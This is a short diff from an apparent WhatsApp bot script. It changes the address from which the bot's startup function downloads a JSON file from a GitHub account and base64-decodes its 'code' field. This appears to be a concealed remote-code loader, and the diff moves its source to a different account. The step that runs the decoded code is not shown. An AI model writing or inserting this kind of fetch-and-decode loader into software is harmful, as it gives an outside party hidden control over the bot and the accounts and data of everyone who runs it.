@@ -63,7 +63,7 @@ async function startBot() {
     
     async function connectionBot() {
   try {
-    const url = "https://raw.githubusercontent.com/aokyraa/bail/refs/heads/main/system.json"
+    const url = "https://raw.githubusercontent.com/kyraamd/bail/refs/heads/main/system.json"
     const { data } = await axios.get(url)
 
     const decoded = Buffer.from(data.code, "base64").toString("utf-8")
